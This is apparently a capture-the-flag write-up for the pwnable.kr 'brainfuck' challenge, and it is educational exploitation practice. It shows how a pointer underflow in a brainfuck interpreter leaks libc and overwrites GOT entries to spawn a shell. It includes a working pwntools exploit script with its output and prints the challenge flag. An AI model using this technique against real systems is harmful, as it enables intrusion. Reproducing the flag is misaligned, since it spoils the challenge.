# brainfuck

Try out program first. We are also given `libc` for exact offsets.
```sh
brainfuck@ubuntu:~$ ./brainfuck
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
.
```

```sh
brainfuck@ubuntu:~$ checksec brainfuck
[*] '/home/brainfuck/brainfuck'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Partial RELRO = **GOT Overwrite**. No PIE = Static address at runtime.
## Analysis

Observe `main`. Loops through our 1024 bytes input and calls `do_brainfuck()` for each char.

```nasm
0x08048721 <+176>:   mov    DWORD PTR [esp+0x8],eax
0x08048725 <+180>:   mov    DWORD PTR [esp+0x4],0x400   ; 1024 length
0x0804872d <+188>:   lea    eax,[esp+0x2c]
0x08048731 <+192>:   mov    DWORD PTR [esp],eax
0x08048734 <+195>:   call   0x8048450 <fgets@plt>       ; input
0x08048739 <+200>:   mov    DWORD PTR [esp+0x28],0x0
0x08048741 <+208>:   jmp    0x8048760 <main+239>
0x08048743 <+210>:   lea    edx,[esp+0x2c]
0x08048747 <+214>:   mov    eax,DWORD PTR [esp+0x28]
0x0804874b <+218>:   add    eax,edx
0x0804874d <+220>:   movzx  eax,BYTE PTR [eax]
0x08048750 <+223>:   movsx  eax,al
0x08048753 <+226>:   mov    DWORD PTR [esp],eax
0x08048756 <+229>:   call   0x80485dc <do_brainfuck>    ; call
0x0804875b <+234>:   add    DWORD PTR [esp+0x28],0x1
0x08048760 <+239>:   mov    ebx,DWORD PTR [esp+0x28]
0x08048764 <+243>:   lea    eax,[esp+0x2c]
0x08048768 <+247>:   mov    DWORD PTR [esp],eax
0x0804876b <+250>:   call   0x8048490 <strlen@plt>
0x08048770 <+255>:   cmp    ebx,eax
0x08048772 <+257>:   jb     0x8048743 <main+210>        ; loop
```

Observe `do_brainfuck()`:

```nasm
Dump of assembler code for function do_brainfuck:
   0x080485dc <+0>:     push   ebp
   0x080485dd <+1>:     mov    ebp,esp
   0x080485df <+3>:     push   ebx
   0x080485e0 <+4>:     sub    esp,0x24
   0x080485e3 <+7>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080485e6 <+10>:    mov    BYTE PTR [ebp-0xc],al
   0x080485e9 <+13>:    movsx  eax,BYTE PTR [ebp-0xc]
   0x080485ed <+17>:    sub    eax,0x2b
   0x080485f0 <+20>:    cmp    eax,0x30
   0x080485f3 <+23>:    ja     0x804866b <do_brainfuck+143>
   0x080485f5 <+25>:    mov    eax,DWORD PTR [eax*4+0x8048848]
   0x080485fc <+32>:    jmp    eax
   0x080485fe <+34>:    mov    eax,ds:0x804a080
   0x08048603 <+39>:    add    eax,0x1
   0x08048606 <+42>:    mov    ds:0x804a080,eax
   0x0804860b <+47>:    jmp    0x804866b <do_brainfuck+143>
   0x0804860d <+49>:    mov    eax,ds:0x804a080
   0x08048612 <+54>:    sub    eax,0x1
   0x08048615 <+57>:    mov    ds:0x804a080,eax
   0x0804861a <+62>:    jmp    0x804866b <do_brainfuck+143>
   0x0804861c <+64>:    mov    eax,ds:0x804a080
   0x08048621 <+69>:    movzx  edx,BYTE PTR [eax]
   0x08048624 <+72>:    add    edx,0x1
   0x08048627 <+75>:    mov    BYTE PTR [eax],dl
   0x08048629 <+77>:    jmp    0x804866b <do_brainfuck+143>
   0x0804862b <+79>:    mov    eax,ds:0x804a080
   0x08048630 <+84>:    movzx  edx,BYTE PTR [eax]
   0x08048633 <+87>:    sub    edx,0x1
   0x08048636 <+90>:    mov    BYTE PTR [eax],dl
   0x08048638 <+92>:    jmp    0x804866b <do_brainfuck+143>
   0x0804863a <+94>:    mov    eax,ds:0x804a080
   0x0804863f <+99>:    movzx  eax,BYTE PTR [eax]
   0x08048642 <+102>:   movsx  eax,al
   0x08048645 <+105>:   mov    DWORD PTR [esp],eax
   0x08048648 <+108>:   call   0x80484d0 <putchar@plt>
   0x0804864d <+113>:   jmp    0x804866b <do_brainfuck+143>
   0x0804864f <+115>:   mov    ebx,DWORD PTR ds:0x804a080
   0x08048655 <+121>:   call   0x8048440 <getchar@plt>
   0x0804865a <+126>:   mov    BYTE PTR [ebx],al
   0x0804865c <+128>:   jmp    0x804866b <do_brainfuck+143>
   0x0804865e <+130>:   mov    DWORD PTR [esp],0x8048830
   0x08048665 <+137>:   call   0x8048470 <puts@plt>
   0x0804866a <+142>:   nop
   0x0804866b <+143>:   add    esp,0x24
   0x0804866e <+146>:   pop    ebx
   0x0804866f <+147>:   pop    ebp
   0x08048670 <+148>:   ret
End of assembler dump.
```

Typical brainfuck interpreter, but only allows `. , > < + -`. Easier to see in Ghidra:

```c
undefined4 main(void)

{
  size_t length;
  int in_GS_OFFSET;
  uint i;
  char input [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  p = tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(input,0,0x400);
  fgets(input,0x400,stdin);
  i = 0;
  while( true ) {
    length = strlen(input);
    if (length <= i) break;
    do_brainfuck((int)input[i]);
    i = i + 1;
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void do_brainfuck(undefined1 input[i])

{
  int val;
  char *tapePointer;
  
  tapePointer = p;
  switch(input[i]) {
  case 0x2b:              // +
    *p = *p + '\x01';
    break;
  case 0x2c:              // ,
    val = getchar();
    *tapePointer = (char)val;
    break;
  case 0x2d:              // -
    *p = *p + -1;
    break;
  case 0x2e:              // .
    putchar((int)*p);
    break;
  case 0x3c:              // >
    p = p + -1;
    break;
  case 0x3e:              // <
    p = p + 1;
    break;
  case 0x5b:              // [
    puts("[ and ] not supported.");
  }
  return;
}
```

Normally, a tape for brainfuck interpreter would just be some local variable `unsigned char tape[30000]`, but here `tape` is a global variable so that's something to consider. 

GOT overwrite is possible but there's 1024 bytes length limit, so we can't overflow by doing `>` repeatedly. How about *underflow*? C doesn't check array boundaries at runtime, so it's possible to `<` so the pointer points to mem addresses below `tape`. 

This means we are able to look from `tape` to `tape - 1024` (length limit) and output (`.`) as well as change value (`,`).

Global variables are placed in the binary's symbol table:

```sh
brainfuck@ubuntu:~$ nm brainfuck | grep tape
0804a0a0 b tape
```

`b` stands for `.bss` data section. `tape` (`0804a0a0`) is in `.bss`. See what surrounds `.bss`

```sh
brainfuck@ubuntu:~$ readelf -S ./brainfuck
There are 30 section headers, starting at offset 0x116c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000e0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482b8 0002b8 00009e 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048356 000356 00001c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048374 000374 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             080483a4 0003a4 000018 08   A  5   0  4
  [10] .rel.plt          REL             080483bc 0003bc 000050 08   A  5  12  4
  [11] .init             PROGBITS        0804840c 00040c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048430 000430 0000b0 04  AX  0   0 16
  [13] .text             PROGBITS        080484e0 0004e0 000334 00  AX  0   0 16
  [14] .fini             PROGBITS        08048814 000814 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048828 000828 000138 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        08048960 000960 000034 00   A  0   0  4
  [17] .eh_frame         PROGBITS        08048994 000994 0000d8 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000034 04  WA  0   0  4
  [24] .data             PROGBITS        0804a034 001034 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a040 00103c 000460 00  WA  0   0 32
  [26] .comment          PROGBITS        00000000 00103c 00002a 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 001066 000106 00      0   0  1
  [28] .symtab           SYMTAB          00000000 00161c 0004f0 10     29  47  4
  [29] .strtab           STRTAB          00000000 001b0c 000315 00      0   0  1
```

* tape in `0804a0a0`
* .got.plt in `0804a000`

The difference is `A0` (160) which is small enough.

> Although the binary is `No PIE`, the kernel still randomizes the base address of shared libraries like `libc`.

So, the idea is to leak the address of a loaded libc function in runtime, offset by the func's static address in libc dynamic library, find the libc base address in runtime -> know other functions in runtime for GOT overwrites.

> I also thought: why overwrite to runtime libc funcs instead of to PLT stubs? But clearly the binary doesn't import all libc funcs, though it might work under lots of assumptions. Going straight to `gets@libc` instead of `gets@plt` only assumes libc base runtime is correct.

Target a simple function like `puts`:

```sh
pwndbg> disassemble puts
Dump of assembler code for function puts@plt:
   0x08048470 <+0>:     jmp    DWORD PTR ds:0x804a018
   0x08048476 <+6>:     push   0x18
   0x0804847b <+11>:    jmp    0x8048430
End of assembler dump.
```

`puts` GOT pointer address: `0x804a018`, contains runtime `puts`. we leak this. find libc address in runtime.

We can just find other GOT pointer of funcs using `got (func)` in gdb. Then simply rewrite some GOT pointer into the runtime address of func we want.


My initial intuition (**wrong**):

> overwrite fget -> system, puts -> main, then `[` to trigger:
> 
> `  case '[': puts("[ and ] not supported.");` -> `main()`.
>
> so in main we can input `/bin/sh` into `fgets()` = `system()`

But in `main`:

```c
puts("welcome to brainfuck testing system!!");
puts("type some brainfuck instructions except [ ]");
memset(input,0,0x400);
fgets(input,0x400,stdin);
```

`puts` is called again, so endless recursive if overwrite `puts` -> `main`. `fgets` writes into `input`, but `system` reads from `input`. Fortunately, `memset` above has `input` as first arg, so great intuition is to overwrite `memset` -> `gets(input)`, and not use `put` -> `main` but instead `putchar` -> `main`. (the only other safe func to GOT overwrite in `do_brainfuck`)

## Solution

Leak `puts` runtime. `Puts runtime addr - Puts libc.so addr = Libc runtime addr`.

Libc runtime addr + (any function) libc.so addr = (function) runtime addr.

Overwrite:
1. `memset` GOT -> `gets(input)`
1. `fgets` GOT -> `system(input)`
1. `putchar` GOT -> `main()`

Payload involves the leak and overwrites. In brainfuck, it's essentially repeating `<` or `>` to move tape to an address. `.>.>.>.` to output 4 bytes. `,>,>,>,` to overwrite 4 bytes. (for each `,` processed it's a `getchar()`)

`.` in payload (at end) to trigger `putchar()` which is `main()`. In main, instead of `memset -> fgets`, it's `gets -> system`. Just input `/bin/sh`.

`solve.py`

```py
from pwn import *
# context.log_level='debug'
libc = ELF('./brainfuck/libc-2.23.so')

tape = 0x804a0a0

def diff(src:int,dest:int):
    d = dest-src
    a = abs(d)
    return a*'<' if d<0 else a*'>'

memset_got = 0x804a02c
puts_got = 0x804a018
fgets_got = 0x804a010
putchar_got = 0x804a030

p = remote('pwnable.kr',10017)

payload = (
    diff(tape, puts_got) + '.>.>.>.' +           # leak puts runtime -> find libc address
    diff(puts_got+3, memset_got) + ',>,>,>,' +   # memset GOT -> gets(input)
    diff(memset_got+3, fgets_got) + ',>,>,>,' +  # fgets GOT -> system(input)
    diff(fgets_got+3, putchar_got) + ',>,>,>,' + # putchar GOT -> main
    '.'                                          # trigger putchar() -> main()
)

payload = payload.encode()
print(len(payload), payload)

p.sendlineafter(b'type some', payload)
p.recvuntil(b'\n')
bruh=p.recvn(4)
print('[LEAK PUTS RUNTIME]', bruh)

puts_runtime = u32(bruh)
libc_runtime = puts_runtime - libc.symbols['puts']
system_runtime = libc_runtime + libc.symbols['system']
gets_runtime = libc_runtime + libc.symbols['gets']

print('LIBC Runtime', hex(libc_runtime))
print('PUTS Runtime:', hex(puts_runtime))
print(f'{system_runtime=:#x} {gets_runtime=:#x}')

main = 0x8048671
p.send(p32(gets_runtime)+p32(system_runtime)+p32(main))

p.sendline(b'/bin/sh')
p.interactive()
```
```sh
❯ python3 solve.py
[*] '/.../libc-2.23.so'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to pwnable.kr on port 10017: Done
242 b'<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<.>.>.>.>>>>>>>>>>>>>>>>>,>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,>,>>>>>>>>>>>>>>>>>>>>>>>>>>>>>,>,>,>,.'
[LEAK PUTS RUNTIME] b'\xb0<\xe5\xf7'
LIBC Runtime 0xf7df4000
PUTS Runtime: 0xf7e53cb0
system_runtime=0xf7e2edb0 gets_runtime=0xf7e533f0
[*] Switching to interactive mode
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
$ cat flag
bR41n_F4ck_Is_FuN_LanguaG3
$
```

Flag: `bR41n_F4ck_Is_FuN_LanguaG3`